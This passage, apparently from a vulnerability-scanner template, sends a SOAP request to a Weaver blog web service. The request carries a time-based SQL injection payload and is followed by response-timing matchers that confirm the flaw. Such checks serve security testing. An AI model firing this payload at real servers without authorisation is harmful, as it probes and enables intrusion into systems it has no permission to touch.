        Content-Length: 457

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
           <soapenv:Header/>
           <soapenv:Body>
              <web:sendSubmitRemind>
                 <!--type: string-->
                 <web:in0>1</web:in0>
                 <!--type: string-->
                 <web:in1>2</web:in1>
                 <!--type: string-->
                 <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(5)))kzVQ) AND 'Wxlz'='Wxlz'</web:in2>
              </web:sendSubmitRemind>
           </soapenv:Body>
        </soapenv:Envelope>
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"
